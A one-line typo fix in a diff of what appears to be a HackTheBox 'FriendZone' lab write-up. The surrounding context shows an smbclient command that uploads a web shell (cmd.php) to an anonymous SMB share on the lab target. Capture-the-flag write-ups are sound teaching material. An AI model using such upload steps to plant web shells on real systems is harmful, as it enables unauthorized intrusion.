@@ -478,7 +478,7 @@ Let's create a simple web-shell:
 ```
 
 
-And try to uplaod this to the share with this a one-liner:
+And try to upload this to the share with this a one-liner:
 
 ```bash
 smbclient -N \\\\friendzone.htb\\Development -c 'put cmd.php test.php'
